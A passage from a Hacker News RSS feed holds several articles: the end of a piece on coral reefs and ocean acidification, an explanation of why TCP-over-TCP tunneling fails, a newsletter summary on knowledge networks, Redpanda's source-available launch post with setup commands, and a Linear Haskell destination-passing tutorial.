<p>In 2013, Microsoft cofounder Paul Allen announced a contest called Ocean Challenge. The contest awarded â€œ$10,000 to the most promising new science-based concept for mitigating environmental and/or societal impacts of ocean acidification.â€� The winners of the contest were Ruth D. Gates of the University of Hawaii and Madeleine van Oppen of the Australian Institute of Marine Science. Their project to genetically select and cultivate corals that possess natural resistance to ocean acidification received funding. Coral reefs take up less than 1 percent of the earthâ€™s surface, yet they are habitats for an estimated one-third of all known marine creatures, including 25 percent of commercial seafood species. They also act as natural breakwaters, dampening the power of storm surges and coastal erosion. An estimated 61 percent of coral reefs are under stress and at risk of disappearing by 2030. Thus, the health of coral reefs is widely used as a metric for global ocean health, the marine equivalent of the canary in the coal mine. Gates, who passed away in October 2018, described herself as â€œa futurist.â€� â€œA lot of people want to go back to something. They think, If we just stop doing things, maybe the reef will come back to what it was,â€� she explained. In contrast, her project acknowledged a future â€œwhere nature is no longer fully natural.â€� In Gatesâ€™s understanding, the ocean isnâ€™t dead, but its survival hinges on assumption of responsibility for its now-hybrid character. Is there a cost to abandoning the nineteenth-century ideal of wilderness? Perhaps doing so is the price we must pay to retain a semblance of what once was.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_6dede823a3aee1159948a355f8d25912.jpg" alt="Screen Shot 2020-11-11 at 9.06.26 PM"><figcaption><span>Detail from a mural by Louis Masai in Shoreditch, London. </span><br><span><a href="https://www.flickr.com/photos/maureen_barlin/21563934214/in/photolist-yRwNnd-nBHi7g-J1mTKy-uR5dZN-yKkUdq-ZpCe1C-tWo3oY-zcVVAU-z1WCtb-vx1TMN-A7rnFd-f8wmYU-tWnYzA-uToKiz-dQNque-HWgEzz">Maureen Barlin</a>. </span></figcaption></figure>
<p>Some theorists and scientists advocate greater inclusion of nonhuman actors in debates about ecological crisis. Bruno Latour, for example, argues that â€œa science of objects and politics of subjectsâ€� must be replaced by a â€œpolitical ecology of collectives consisting of humans and nonhumans.â€� A precedent has been set by the recent allocation of legal rights to rivers in Australia, New Zealand, and India. But although we must not shirk from placing value on nonhuman entities, in the end climate change—and by extension marine environmental degradation—remains a human problem, and we need to foreground human abilities to comprehend and solve it. As Jean-Michel Cousteau, son of Jacques, asserts, â€œThe face of our planet is the ocean. It is the largest ecosystem on our Earth. But the face of climate change is not the whale, the polar bear, the glacier, the rainforest or the desert. The face of climate change is us.â€�&nbsp;<br></p>
<p>The marine sciences, like all branches of scientific knowledge, are shaped by underlying assumptions about human relationship with the natural world. The tensions I have highlighted point to a crisis in scientific and lay imaginations of an ocean radically changed in the course of the Anthropocene. Scientists increasingly talk about the ocean as a hybrid environment. Gates was surely correct in asserting that scientific solutions for an ocean understood as dying can be reached only by acknowledging that the contemporary ocean cannot be conceived apart …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</a></em></p>]]>
            </description>
            <link>http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080998</guid>
            <pubDate>Fri, 13 Nov 2020 10:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why TCP over TCP is a bad idea (2001)]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25080693">thread link</a>) | @fanf2
<br/>
November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </p><hr>
    <address><a href="mailto:olaf@bigred.inka.de">Olaf Titz</a></address>
<!-- Created: Sun Oct 10 20:56:27 CEST 1999 -->
<!-- hhmts start -->
Last modified: Mon Apr 23 11:50:59 CEST 2001
<!-- hhmts end -->
  

</div>]]>
            </description>
            <link>http://sites.inka.de/~bigred/devel/tcp-tcp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080693</guid>
            <pubDate>Fri, 13 Nov 2020 09:43:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Knowledge Economy: The Rise of Community-Curated Knowledge Networks]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076142">thread link</a>) | @davefreiburger
<br/>
November 12, 2020 | https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/ | <a href="https://web.archive.org/web/*/https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			<article id="post-920">
				<!--<a href="https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">-->
					<div>
						<div>
	              			<!-- category colored coded display and hide takeaways php -->
	              											<p>																Wealth								</p><!-- end cat-wrap -->
						<p><span>&nbsp; •&nbsp; </span>
						<span>The Knowledge Economy</span>
						<span> &nbsp;•&nbsp; </span>
						<span>
							November 12, 2020						</span>

						<img width="640" height="337" src="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png" alt="" loading="lazy" srcset="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png 1024w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-300x158.png 300w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-768x404.png 768w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1536x808.png 1536w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth.png 1900w" sizes="(max-width: 640px) 100vw, 640px"></p><div>

																					<div>
								<p><a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
									[Image source: Check your Pulse #55 / Sari Azout]								</a></p><h5>
									<a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
										The rise of community-curated knowledge networks									</a>
									 &nbsp;by Sari Azout / Check your Pulse									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<ul>
<li><span>This piece of content is all about the future of/how to think about online communities at the intersection of content curation and knowledge management&nbsp; 🤯 … *strap in*</span></li>
<li><span>“At least 2.5 quintillion bytes of information are produced every day, which is approximately what was produced during all of 2002. While this presents enormous opportunities, our brains are not equipped to deal with this abundance.” — Sari Azout</span></li>
<li><span>“We seem to have forgotten that the goal is not to consume more information. The goal is to think better, so we can achieve our goals.” — Sari Azout</span></li>
<li><span>“There’s a whole economy around knowledge organization available for the taking…&nbsp;</span>
<ul>
<li><span>Three intersecting problems remain unsolved:&nbsp;</span></li>
</ul>
</li>
</ul>
<ol>
<li>
<ol>
<li>
<ol>
<li><span>Our feed-based information architecture is obsessed with the present.</span></li>
<li><span>We consume information recreationally, not as a way to achieve our goals.</span></li>
<li><span>Curation has been too focused on the information and not enough on architecture; how we collect, store, augment, and utilize what’s already in our minds.” — Sari Azout</span></li>
</ol>
</li>
</ol>
</li>
</ol>
<ul>
<li><span>“Without an information architecture that supports a longer shelf life for content, we will continue to accumulate mental and behavioral debt.” — Sari Azout</span></li>
<li><span>“What’s amazing is how chronological feeds — essentially accidental experiments of digital architecture — have rewired our brains. In the feed, everything is fleeting. This design property means you’re either always on and connected, or you’re off and wondering if you’re missing something important.” — Sari Azout</span></li>
<li><span>“In short, the architecture of digital platforms has made us obsessive documenters and consumers of the present, yet largely indifferent to the archives we create.” — Sari Azout</span></li>
<li><span>“Blending curation and community to inhabit a space I call: new media. On the community side, we’re witnessing a shift towards a post-social media era defined by niche, gated communities of interest and purpose.” — Sari Azout</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>You might be wondering why I included this in the wealthy section. It’s not a bad question! After reading this piece, I immediately thought about the amount of opportunities the “online communities at the intersection of content curation and knowledge management” space presents…I highly suggest following Sari Azout [</span><a href="https://twitter.com/sariazout"><b><i>here</i></b></a><span>] as she’s going to be announcing what she’s been working on soon 👀 </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div><!-- end newsletter wrap content -->
					</div><!-- end newsletter wrap -->
				<!--</a>-->
			</div></article><!-- #post-## -->
		</div></div>]]>
            </description>
            <link>https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076142</guid>
            <pubDate>Thu, 12 Nov 2020 22:35:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RedPanda: 10x Faster Kafka]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25075739">thread link</a>) | @sorenbs
<br/>
November 12, 2020 | https://vectorized.io/open-source/ | <a href="https://web.archive.org/web/*/https://vectorized.io/open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><img src="https://vectorized.io/5fec7d1698c66e160017f1ad37732a09/redpanda-bsl.svg" alt="always"></p></div>
<p>We are building a real-time streaming engine for modern applications - from the enterprise to
the solo dev prototyping a react application on her laptop. We go beyond the Kafka protocol,
into the future of streaming with inline WASM transforms and geo-replicated hierarchical storage.
A new platform that scales with you from the smallest projects to petabytes of data distributed across the globe. </p>
<h2 id="Background">Background<a href="#Background" aria-label="Background permalink"></a></h2>
<p>As easy to run as <code>nginx</code>. No dependencies. Ability to flush to disk with <code>acks=-1</code>.
Leverage a huge and active ecosystem. It must be fast, really fast. With this wishlist
in mind, I wrote the first line of code of what eventually became <code>redpanda</code>. It was January 7th,
2019 and I was still living in Miami before relocating to San Francisco. I hadn’t had as much
fun hacking on anything since the initial prototype of my previous project &amp; company <a href="http://www.concord.io/" target="_self" rel="nofollow">concord.io</a>
and… it was equally all-consuming.</p>
<p>Here we are today, 22 months later. A team one dreams to be part of and a product we feel proud to
share with you. Ready to be put through the paces in even more ways that we could have anticipated,
whether embedding Redpanda in a security appliance, or using it as part of your new NodeJS application
because it’s so simple to use. Whoever you are, welcome! We are excited to have you in our community.</p>
<h2 id="Legal">Legal<a href="#Legal" aria-label="Legal permalink"></a></h2>
<p>The project is released under the Source Available License - BSL - similar to what our friends at CockroachDB have done.
We try to make this clear in the license, but worth reiterating here. Our intention is to deter cloud providers from offering our work as a service.
For 99.999% of you, restrictions will not apply - welcome to our community!</p>
<p>There will be enterprise, pay-only features that will be obvious, since to turn them on you have to
edit the <code>enterprise</code> section of the configuration. </p>
<h2 id="Getting-Started">Getting Started<a href="#Getting-Started" aria-label="Getting Started permalink"></a></h2>
<p>The simplest thing you can do is run in Docker. Follow the <a href="https://vectorized.io/rpk-container">tutorial here</a>.
But for the truly impatient, here is the executive summary: </p>
<div data-language="text"><pre><code>$ rpk container start -n 3
NODE ID  ADDRESS          CONFIG                                             
  0        172.24.1.2:9092  /home/david/.rpk/cluster/node-0/conf/redpanda.yaml  
  1        172.24.1.4:9092  /home/david/.rpk/cluster/node-1/conf/redpanda.yaml  
  2        172.24.1.3:9092  /home/david/.rpk/cluster/node-2/conf/redpanda.yaml  

Cluster started! You may use 'rpk api' to interact with the cluster. E.g:

rpk api status</code></pre></div>
<p>It says we can check our cluster with <code>rpk api status</code> Let’s try that!</p>
<div data-language="text"><pre><code>$ rpk api status
  Redpanda Cluster Status                   
                                            
  0 (172.24.1.2:9092)      (No partitions)  
                                            
  1 (172.24.1.3:9092)      (No partitions)  
                                            
  2 (172.24.1.4:9092)      (No partitions)</code></pre></div>
<p>All of the <code>rpk api</code> subcommands will detect the local cluster and use its addresses, so you don’t have to configure anything or keep track of IPs and ports.</p>
<p>For example, you can run <code>rpk api topic create</code> and it will work!</p>
<div data-language="text"><pre><code>$ rpk api topic create -p 6 -r 3 new-topic
Created topic 'new-topic'. Partitions: 6, replicas: 3, cleanup policy: 'delete'</code></pre></div>
<h2 id="Thank-you">Thank you<a href="#Thank-you" aria-label="Thank you permalink"></a></h2>
<p>This decision comes after almost a year of thinking and mentorship with a very large group of experts, OSS enthusiasts,
lawyers and quiet time thinking. Special thanks to Peter Mattis from CockroachDB for sharing his experience with BSL
which ultimately made us feel comfortable with our decision to also choose BSL. Adam Jacob for sharing his experiences with Chef,
his never-ending expertise around licensing and for taking the time to walk me through business models with me.
Thanks to Ajay Kulkarni from TimescaleDB for sharing his wealth of knowledge and experience building a community.
Thanks to Megan Gill at MongoDB for helping me better understand OSS in general, and to Gaurav Gupta now at LSVP
for helping me understand Elastic a bit better and how the OSS+Source Available has matured in the last decade.
We are better because of your advice, I am forever thankful.</p></section></div>]]>
            </description>
            <link>https://vectorized.io/open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075739</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure destination-passing style in Linear Haskell]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25075718">thread link</a>) | @lelf
<br/>
November 12, 2020 | https://www.tweag.io/blog/2020-11-11-linear-dps/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-11-11-linear-dps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>My goal today is to convince you that destination-passing style is
neat, actually. And that <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> make
destination-passing purely functional. But first, I must answer a
question.</p>
<h2>What is destination-passing style?</h2>
<p>If you’ve ever programmed in C, C++, or Fortran, you are sure to have
encountered the style of programming which sometimes goes by the name
<em>destination-passing style</em>. It is the practice of writing, <em>e.g.</em> an
array-producing functions as, instead, taking an empty array as an
extra argument and filling it. Consider, for example, the C <code>strcpy</code> function:</p>
<div data-language="c"><pre><code><span>char</span><span>*</span> <span>strcpy</span> <span>(</span> <span>char</span><span>*</span> destination<span>,</span> <span>const</span> <span>char</span><span>*</span> source <span>)</span><span>;</span></code></pre></div>
<p>It copies the string in <code>source</code> to the array <code>destination</code> (it also
returns <code>destination</code> when it’s done).</p>
<p>The name “destination-passing style” itself seems to be more common in
the functional programming language compilation literature, however. C
programmers don’t appear to have a name for it. So it is likely that
you have never encountered it.</p>
<h2>But this is extremely imperative, why should I care?</h2>
<p>Why, indeed, care about destination-passing? It does let you ask a new
question: “whose responsibility is it to allocate the array?“. If I
were to write an array copy in Haskell, it would have type</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span></code></pre></div>
<p>And there is no way around <code>copyArray</code> allocating an array itself. The
question doesn’t even exist. With <code>strcpy</code>, I can either choose to
allocate an array, and pass it immediately to <code>strcpy</code>, or, I can
delegate the allocation of the array to someone else.</p>
<p>But, once I can ask this question, what can I do with it? I can
compose it! Let’s imagine that we have a function to split an array in
two</p>
<div data-language="haskell"><pre><code><span>splitArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span></code></pre></div>
<p>Now consider the following (admittedly not especially useful)
function:</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray2</span> <span>a</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>&lt;&gt;</span> <span>copyArray</span> <span>ar</span></code></pre></div>
<p>When the question doesn’t exist, each call to <code>copyArray</code> has, no matter what,
to allocate an array, which is then copied into a new array. It means
that we are making a superfluous copy of our original array,
only to discard it immediately. This is quite wasteful.</p>
<h2>Won’t fusion take care of that, though?</h2>
<p>Often, you can, indeed, rely on array fusion to avoid too egregious a
behaviour. Array fusion, such as implemented in the excellent <a href="https://hackage.haskell.org/package/vector">vector</a>
library will eliminate a ton of intermediate allocations.</p>
<p>However, fusion is unreliable. Sometimes, a simple refactoring will
push a function’s size beyond what GHC is willing to inline, and it
will break an entire fusion pipeline. Most of the time, this is fine,
but not when you are dependent on fusion happening. And if you need
GHC to produce code without allocations, why not write your program directly as you want
it, rather than try and coax the compiler into hopefully eliminating
the allocations for you.</p>
<p>This has been a guiding principle in the development of the linear
types project: <strong>compiler optimisations are great, as you don’t need
to think about a lot of things; until you do, and you find yourself
second-guessing the optimiser</strong>. When that happens, we want linear
types to empower you to write the code that you mean, without
sacrificing Haskell’s type safety.</p>
<p>Besides, in the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">article about F̃</a>, a restricted array-based
functional language which compiles to very efficient code, the authors
find significant performance gains for using destination-passing on
top of an array fusion optimisation. They only use destination-passing
in the optimiser, though, not as a language feature.</p>
<p>Finally, fusion doesn’t always work. Suppose I rewrite my <code>copyArray2</code>
function to use threads to better utilise my multicore architecture</p>
<div data-language="haskell"><pre><code><span>copyArray3</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>IO</span> <span>(</span><span>Array</span> <span>a</span><span>)</span>
<span>copyArray3</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>do</span>
    <span>(</span><span>bl</span><span>,</span> <span>br</span><span>)</span> <span>&lt;-</span> <span>concurrently</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>al</span><span>)</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>ar</span><span>)</span>
    <span>return</span> <span>$</span> <span>bl</span> <span>&lt;&gt;</span> <span>br</span></code></pre></div>
<p>This is beyond a fusion framework ability to optimise. Or maybe I want
to copy my array into a memory mapped buffer. The point is: fusion
will do a lot for you, just not everything.</p>
<h2>Ok, but does that mean I have to use ST everywhere?</h2>
<p>The obvious way to encode destination-passing style, in Haskell, is to
move all our computation to <code>ST</code>, so that <code>copyArray</code> would be</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>ST</span> <span>(</span><span>)</span></code></pre></div>
<p>But it’s not very congruent with how functional programmers write
their programs. It does lift all of the above limitations, at the
price of adding state everywhere, which is an entire error-inducing
surface that functional programming usually avoids.</p>
<p>It’s a huge price to pay, and that’s why the <a href="https://hackage.haskell.org/package/vector">vector</a> library is not
structured like this. It does feature mutable arrays, but immutable
arrays are very much encouraged.</p>
<p>This is where <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> help. Indeed, let’s take a
step back and ask: what makes a destination impure to begin with?</p>
<ul>
<li>If I read out a cell, then write to it, then read it again: I’ll see a
different result the second time.</li>
<li>If I write to the same cell twice, the writes need to be ordered,
otherwise the result would be non-deterministic.</li>
<li>Reading a cell which has not been initialised is non-deterministic
(though in most case, we can salvage this by initialising every cell
with <code>undefined</code>)</li>
</ul>
<p>All of these behaviours are prohibited in pure code. But we could
avoid all the prohibited behaviours if we could make sure that each
cell is written to exactly once before being read. Aha! Exactly once,
this is the sort of thing that linear types are good at! Ok, so let’s
try again:</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span></code></pre></div>
<p>This means that <code>copyArray</code> is a <em>pure</em> function which uses its destination
(in its entirety) exactly once. We only need to make sure that there
is only ever a unique pointer to a destination array, which we do with
the <code>alloc</code> function:</p>
<div data-language="haskell"><pre><code><span>alloc</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>(</span><span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span><span>)</span> ⊸ <span>Array</span> <span>a</span></code></pre></div>
<p>A destination is allocated for the scope of the linear function. At
the end of the function, we know that the destination has been fully
filled, and so we get an array out. From this destination-passing
version of <code>copyArray</code>, by the way, it is easy to retrieve the
direct style variant:</p>
<div data-language="haskell"><pre><code><span>copyArray</span>' <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray</span>' <span>a</span> <span>=</span> <span>alloc</span> <span>(</span><span>length</span> <span>a</span><span>)</span> <span>(</span><span>\</span><span>d</span> <span>-&gt;</span> <span>copyArray</span> <span>a</span> <span>d</span><span>)</span></code></pre></div>
<p>The reverse, as I’ve been arguing throughout this post, is very much
not true. So the destination-passing function is the more fundamental
one.</p>
<p>Now, to be able to implement <code>copyArray2</code>, we need a function which
splits destinations</p>
<div data-language="haskell"><pre><code><span>splitDArray</span> <span>::</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>Then, it is just a matter of following the types (the curious-looking <code>&amp; \case</code> construction is due to a limitation of the current
implementation of linear types in GHC, see <a href="https://github.com/tweag/linear-base/blob/8642e4209ffd663e1f1f35ddd977da0d073fa1af/docs/USER_GUIDE.md#case-statements-are-not-linear">here</a>)</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span>
<span>copyArray2</span> <span>a</span> <span>d</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>splitDArray</span> <span>d</span> <span>&amp;</span> <span>\</span><span>case</span>
    <span>(</span><span>dl</span><span>,</span> <span>dr</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>dl</span> <span>`lseq`</span> <span>copyArray</span> <span>ar</span> <span>dr</span></code></pre></div>
<p>Voilà! No superfluous allocation. Not because of the optimiser, but
because of the semantics of my program: it doesn’t allocate an array
anywhere.</p>
<p>You’ll find a more complete destination array interface in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Destination.hs">the
<code>Data.Array.Destination</code> module of linear-base</a>.</p>
<h2>Closing thoughts</h2>
<p>One of the features of linear types, is that they often allow to
expose as pure interfaces objects which appear to be intrinsically
impure. But I want to argue that, in the case of destinations, we’ve
actually done more than this: we’ve made the interface <em>better</em> than
the impure interface. Not because pure interfaces are better than
impure interfaces (though it’s a defensible position), but because the
linear destination interface is a more faithful representation of what
destinations mean.</p>
<p>There is no longer confusion about what is an input and what is an
output: inputs are <code>Array</code>, and outputs are <code>DArray</code>. Destinations are
there solely for output, they can’t be used as a temporary store of
data. And the types ensure that they are fully filled, and that we
don’t accidentally overwrite an output, by the time the destination is
read back as an array.</p>
<p>And this is pretty neat.</p>
<p>If you want to go a bit deeper into this particular brand of weed, let
me leave you with a handful of comments which you can take either as
closing this blog post, or opening new avenues.</p>
<ul>
<li>The <code>alloc</code> function takes a destination-consuming function as an
argument, instead of returning a destination directly. This style is
common in Linear Haskell, as a means to enforce uniqueness. It is
sometimes seen as a limitation of Linear Haskell’s design. However
in this particular case, the function is necessary to <em>delimit the
scope</em> of the destination. In fact, the <code>alloc</code> function is
virtually identical to that of the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">F̃ article</a>, where there
is no linear typing whatsoever.</li>
<li>Affine types (affine arguments are consumed <em>at most</em> once,
rather than <em>exactly</em> once for linear arguments) are sometimes
preferable to linear types. For instance affine types appear to
<a href="https://www.tweag.io/blog/2018-06-21-linear-streams/">represent streaming
computations better</a>. But
in the case of destinations we really do want linear types: it
wouldn’t make as much sense to return from <code>alloc</code> with a
partially-filled destination.</li>
<li>When using linear types to make a pure interface to array functions
which, in fact, mutate an array for efficiency (like in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Mutable/Linear.hs">this module
of linear
base</a>),
we lose the ability to alias the mutable array in exchange for
purity. Sometimes it’s a perfectly acceptable trade-off, but some
algorithms depend on sharing mutation for efficiency, these are not
available with linear pure mutable arrays. We are not making such a
trade-off for destinations: linear destinations, being pure output,
are, arguably, a more faithful interface for destination-passing
style than mutable array.</li>
<li>
<p>Have you noticed how in the destination-passing <code>copyArray2</code>, the
call to array concatenation from the direct-style implementation has
been replaced by a call to <code>splitDArray</code>? And, if you have, have you
also noticed the symmetry between these two functions?</p>
<div data-language="haskell"><pre><code><span>uncurry</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>::</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>splitDArray</span> <span>::</span> <span>Darray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>This is not a coincidence. There is a sort of duality between
destinations and constructors. This …</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tweag.io/blog/2020-11-11-linear-dps/">https://www.tweag.io/blog/2020-11-11-linear-dps/</a></em></p>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-11-11-linear-dps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075718</guid>
            <pubDate>Thu, 12 Nov 2020 22:03:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Financial failures that wasted Quibi's $1.75B]]>
            </title>
            <description>
